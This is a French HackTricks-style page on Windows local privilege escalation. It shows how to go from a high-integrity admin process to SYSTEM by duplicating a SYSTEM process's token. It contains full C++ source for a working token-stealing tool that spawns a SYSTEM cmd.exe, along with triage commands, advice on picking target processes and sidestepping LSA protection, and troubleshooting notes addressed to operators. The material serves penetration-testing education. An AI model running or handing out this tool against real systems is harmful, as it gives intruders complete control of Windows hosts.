# SeImpersonate de High à System

{{#include ../../banners/hacktricks-training.md}}

Cette page porte sur la version **manuelle** du passage d’un **processus administrateur à intégrité élevée** à **`NT AUTHORITY\SYSTEM`**, en **ouvrant un processus SYSTEM non protégé, en dupliquant son token et en lançant un processus enfant avec ce token**.

Si vous disposez uniquement de **`SeImpersonatePrivilege`** / **`SeAssignPrimaryTokenPrivilege`** mais que vous **ne pouvez pas ouvrir un processus SYSTEM approprié**, la méthode **Potato / named-pipe** est généralement plus fiable :

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

Si vous ne voulez pas seulement obtenir `SYSTEM`, mais également un **token SYSTEM avec autant de privilèges que possible**, consultez également :

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

## Triage rapide

Avant d’essayer de voler un token, vérifiez rapidement le contexte :
```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege SeAssignPrimaryTokenPrivilege"
```
Notes pratiques :

- Un token administrateur **High Integrity** suffit généralement pour **activer `SeDebugPrivilege`** et ouvrir de nombreux processus SYSTEM non protégés.
- **`CreateProcessWithTokenW` nécessite `SeImpersonatePrivilege`** sur le caller. Si cette API échoue avec `1314`, utilisez `CreateProcessAsUserW` après avoir déjà dupliqué un token primaire SYSTEM.
- Sur les versions modernes de Windows, **`lsass.exe` est souvent une mauvaise cible**, car la protection LSA / PPL bloque l’accès, même pour les administrateurs disposant de `SeDebugPrivilege`. Préférez **`winlogon.exe`**, **`wininit.exe`**, **`services.exe`** ou un **`svchost.exe`** lancé tôt avec les privilèges SYSTEM.
- Tous les processus SYSTEM ne disposent pas d’un token aussi utile. Si vous obtenez SYSTEM mais constatez des privilèges manquants, essayez un autre processus SYSTEM au lieu de supposer que la technique est défaillante.

## Choisir soigneusement le PID

La manière la plus simple de rendre cette technique fiable consiste à **choisir un processus SYSTEM dont la DACL autorise effectivement les Administrators à interroger le processus et à dupliquer son token**.

Bons candidats à tester en premier :

- `winlogon.exe`
- `wininit.exe`
- `services.exe`
- certaines instances précoces de `svchost.exe` s’exécutant avec les privilèges SYSTEM

À éviter par défaut :

- `lsass.exe` sur les hôtes où **RunAsPPL / LSA protection** est activé
- les processus protégés ou sensibles du point de vue de la sécurité qui renvoient `Access denied`, même après l’activation de `SeDebugPrivilege`

Vous pouvez inspecter les processus candidats ainsi que leurs tokens/ACL avec **Process Explorer** ou **Process Hacker** exécuté avec élévation.

### Code

Le code suivant provient de [ici](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962). Il permet **d’indiquer un Process ID comme argument**, puis une CMD **s’exécutant en tant que l’utilisateur** du processus indiqué sera lancée.<sup>[[3]](#references)</sup>\
Depuis un processus High Integrity, vous pouvez **indiquer le PID d’un processus s’exécutant en tant que System** (comme `winlogon` ou `wininit`) et exécuter une `cmd.exe` en tant que SYSTEM.<sup>[[3]](#references)</sup>
```cpp
impersonateuser.exe 1234
```

```cpp:impersonateuser.cpp
// From https://securitytimes.medium.com/understanding-and-abusing-access-tokens-part-ii-b9069f432962

#include <windows.h>
#include <iostream>
#include <Lmcons.h>
BOOL SetPrivilege(
HANDLE hToken,          // access token handle
LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
BOOL bEnablePrivilege   // to enable or disable privilege
)
{
TOKEN_PRIVILEGES tp;
LUID luid;
if (!LookupPrivilegeValue(
NULL,            // lookup privilege on local system
lpszPrivilege,   // privilege to lookup
&luid))        // receives LUID of privilege
{
printf("[-] LookupPrivilegeValue error: %u\n", GetLastError());
return FALSE;
}
tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;
if (bEnablePrivilege)
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
else
tp.Privileges[0].Attributes = 0;
// Enable the privilege or disable all privileges.
if (!AdjustTokenPrivileges(
hToken,
FALSE,
&tp,
sizeof(TOKEN_PRIVILEGES),
(PTOKEN_PRIVILEGES)NULL,
(PDWORD)NULL))
{
printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
return FALSE;
}
if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
{
printf("[-] The token does not have the specified privilege. \n");
return FALSE;
}
return TRUE;
}
std::string get_username()
{
TCHAR username[UNLEN + 1];
DWORD username_len = UNLEN + 1;
GetUserName(username, &username_len);
std::wstring username_w(username);
std::string username_s(username_w.begin(), username_w.end());
return username_s;
}
int main(int argc, char** argv) {
// Print whoami to compare to thread later
printf("[+] Current user is: %s\n", (get_username()).c_str());
// Grab PID from command line argument
char* pid_c = argv[1];
DWORD PID_TO_IMPERSONATE = atoi(pid_c);
// Initialize variables and structures
HANDLE tokenHandle = NULL;
HANDLE duplicateTokenHandle = NULL;
STARTUPINFO startupInfo;
PROCESS_INFORMATION processInformation;
ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
startupInfo.cb = sizeof(STARTUPINFO);
// Add SE debug privilege
HANDLE currentTokenHandle = NULL;
BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
if (SetPrivilege(currentTokenHandle, L"SeDebugPrivilege", TRUE))
{
printf("[+] SeDebugPrivilege enabled!\n");
}
// Call OpenProcess(), print return code and error code
HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, PID_TO_IMPERSONATE);
if (GetLastError() == NULL)
printf("[+] OpenProcess() success!\n");
else
{
printf("[-] OpenProcess() Return Code: %i\n", processHandle);
printf("[-] OpenProcess() Error: %i\n", GetLastError());
}
// Call OpenProcessToken(), print return code and error code
BOOL getToken = OpenProcessToken(processHandle, MAXIMUM_ALLOWED, &tokenHandle);
if (GetLastError() == NULL)
printf("[+] OpenProcessToken() success!\n");
else
{
printf("[-] OpenProcessToken() Return Code: %i\n", getToken);
printf("[-] OpenProcessToken() Error: %i\n", GetLastError());
}
// Impersonate user in a thread
BOOL impersonateUser = ImpersonateLoggedOnUser(tokenHandle);
if (GetLastError() == NULL)
{
printf("[+] ImpersonatedLoggedOnUser() success!\n");
printf("[+] Current user is: %s\n", (get_username()).c_str());
printf("[+] Reverting thread to original user context\n");
RevertToSelf();
}
else
{
printf("[-] ImpersonatedLoggedOnUser() Return Code: %i\n", getToken);
printf("[-] ImpersonatedLoggedOnUser() Error: %i\n", GetLastError());
}
// Call DuplicateTokenEx(), print return code and error code
BOOL duplicateToken = DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
if (GetLastError() == NULL)
printf("[+] DuplicateTokenEx() success!\n");
else
{
printf("[-] DuplicateTokenEx() Return Code: %i\n", duplicateToken);
printf("[-] DupicateTokenEx() Error: %i\n", GetLastError());
}
// Call CreateProcessWithTokenW(), print return code and error code
BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation);
if (GetLastError() == NULL)
printf("[+] Process spawned!\n");
else
{
printf("[-] CreateProcessWithTokenW Return Code: %i\n", createProcess);
printf("[-] CreateProcessWithTokenW Error: %i\n", GetLastError());
}
return 0;
}
```
## Notes utiles sur les API / droits d’accès

L’exemple utilise `MAXIMUM_ALLOWED`, mais pour les opérations réelles, il est utile de se rappeler les éléments minimums concernés :

- `OpenProcessToken()` nécessite uniquement que le **process handle** ait été ouvert avec **`PROCESS_QUERY_LIMITED_INFORMATION`**.
- Pour utiliser `CreateProcessWithTokenW()`, le **primary token handle** doit disposer de **`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`**.<sup>[[1]](#references)</sup>
- `DuplicateTokenEx()` doit créer un **primary token** (`TokenPrimary`), et pas uniquement un **impersonation token**.
- Si vous avez déjà effectué une impersonation de SYSTEM et que `CreateProcessWithTokenW()` échoue toujours avec `1314`, essayez plutôt `CreateProcessAsUserW()`.

Cela signifie qu’ouvrir le processus cible avec `PROCESS_ALL_ACCESS` est généralement inutile et plus bruyant que de demander uniquement les droits nécessaires pour interroger le token.

## Erreur

Dans certains cas, vous pouvez essayer d’effectuer une impersonation de System sans succès, avec une sortie semblable à la suivante :
```cpp
[+] OpenProcess() success!
[+] OpenProcessToken() success!
[-] ImpersonatedLoggedOnUser() Return Code: 1
[-] ImpersonatedLoggedOnUser() Error: 5
[-] DuplicateTokenEx() Return Code: 0
[-] DupicateTokenEx() Error: 5
[-] CreateProcessWithTokenW Return Code: 0
[-] CreateProcessWithTokenW Error: 1326
```
Cela signifie que même si vous exécutez votre code avec un niveau d’intégrité **High**, vous n’avez pas **suffisamment de permissions** sur ce processus/token cible.\
Vérifions les permissions actuelles de l’Administrator sur les processus `svchost.exe` avec **Process Explorer** (vous pouvez également utiliser **Process Hacker**) :

1. Sélectionnez un processus `svchost.exe`
2. Cliquez dessus avec le bouton droit --> Properties
3. Dans l’onglet "Security", cliquez en bas à droite sur le bouton "Permissions"
4. Cliquez sur "Advanced"
5. Sélectionnez "Administrators" et cliquez sur "Edit"
6. Cliquez sur "Show advanced permissions"

![Code - Erreur : 6. Cliquez sur "Show advanced permissions"](<../../images/image (437).png>)

L’image précédente contient toutes les permissions dont dispose "Administrators" sur le processus sélectionné (comme vous pouvez le voir, dans le cas de `svchost.exe`, ils disposent uniquement des permissions "Query").

Voir les permissions dont dispose "Administrators" sur `winlogon.exe` :

![Code - Erreur : Voir les permissions dont dispose "Administrators" sur winlogon.exe](<../../images/image (1102).png>)

Dans ce processus, "Administrators" peut "Read Memory" et "Read Permissions", ce qui permet probablement aux Administrators d’effectuer une impersonation du token utilisé par ce processus.

### Causes courantes d’échec

- **`OpenProcess()` / `OpenProcessToken()` -> `5 (Access denied)`** : la DACL du processus vous bloque, ou la cible est **protected/PPL**. Choisissez un autre processus SYSTEM.
- **`DuplicateTokenEx()` -> `5 (Access denied)`** : votre handle de token a été ouvert sans les droits suffisants, ou la DACL du token cible empêche sa duplication.
- **`CreateProcessWithTokenW()` -> `1314`** : le caller ne dispose pas actuellement de **`SeImpersonatePrivilege`** activé. Essayez d’abord de l’activer ou utilisez `CreateProcessAsUserW()` avec le primary token dupliqué.
- **`CreateProcessWithTokenW()` -> `1326`** après des échecs précédents : cela signifie souvent que l’étape précédente de duplication/impersonation du token a échoué ; il n’existe donc aucun primary token utilisable pour lancer le processus enfant.

## Notes de l’opérateur

- Cette technique est très utile lorsque vous êtes déjà **local admin + high integrity** et que vous souhaitez simplement un moyen rapide et manuel d’obtenir SYSTEM, sans démarrer de service ni mettre en place une chaîne de coercition via named pipe.
- Dans les environnements Windows 11 / Server renforcés, la **LSA protection** est de plus en plus courante ; un workflow qui suppose que `lsass.exe` est toujours lisible est donc fragile. **`winlogon.exe` / `wininit.exe` / `services.exe` sont généralement de meilleurs premiers choix**.<sup>[[2]](#references)</sup>
- Si vous obtenez un contexte de **service account** plutôt que celui d’un bureau admin élevé, la **Potato family** est généralement mieux adaptée que cette page.



## Références

- [1] [Microsoft: CreateProcessWithTokenW](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [2] [SensePost: Abusing Windows' tokens to compromise Active Directory without touching LSASS](https://sensepost.com/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/)
- [3] [Understanding and Abusing Process Tokens — Part II](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962)

{{#include ../../banners/hacktricks-training.md}}
